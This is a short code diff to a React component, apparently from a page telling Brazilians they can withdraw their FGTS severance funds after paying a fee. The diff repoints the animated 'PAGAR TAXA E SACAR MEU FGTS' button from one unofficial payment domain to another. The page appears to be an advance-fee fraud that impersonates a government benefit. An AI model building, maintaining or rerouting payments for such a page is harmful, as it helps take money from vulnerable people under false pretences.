@@ -117,7 +117,7 @@ export function PagamentoTarifa() {
                     width={380}
                 />
 
-                <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
+                <a href="https://pay.iexperience-app.com/f31d1b15" className="w-full">
                     <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
                         PAGAR TAXA E SACAR MEU FGTS
                     </button>
